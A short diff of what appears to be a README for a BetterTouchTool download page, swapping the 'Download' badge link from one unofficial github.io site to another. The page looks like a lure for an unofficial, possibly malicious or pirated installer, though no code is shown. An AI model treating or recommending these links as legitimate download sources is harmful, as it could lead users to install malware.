@@ -4,7 +4,7 @@
 
 ## 📥 Download BetterTouchTool for macOS – Latest Version
 
-[![⬇️ Download BetterTouchTool Mac](https://img.shields.io/badge/Download-BetterTouchTool-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/BetterTouchTool)
+[![⬇️ Download BetterTouchTool Mac](https://img.shields.io/badge/Download-BetterTouchTool-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/BetterTouchTool)
 
 ---
 
